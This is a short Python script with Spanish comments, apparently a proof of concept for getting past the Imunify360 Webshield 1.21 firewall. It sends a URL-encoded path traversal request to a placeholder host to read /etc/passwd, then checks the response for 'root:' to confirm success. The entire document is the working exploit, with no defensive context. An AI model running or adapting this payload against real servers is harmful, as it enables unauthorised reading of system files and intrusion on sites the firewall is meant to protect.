import requests

# URL objetivo donde está configurado Imunify360 Webshield 1.21
target_url = 'http://target.com'

# Ejemplo de bypass codificando caracteres en la URL
bypass_payload = '/%2e%2e/%2e%2e/%2e%2e/etc/passwd'

# Construcción de la URL maliciosa
exploit_url = target_url + bypass_payload

# Envío de la solicitud maliciosa
response = requests.get(exploit_url)

# Imprimir la respuesta para ver si el bypass fue exitoso
if "root:" in response.text:
    print("PoC exitoso: acceso a /etc/passwd logrado")
else:
    print("PoC fallido: el filtro sigue activo")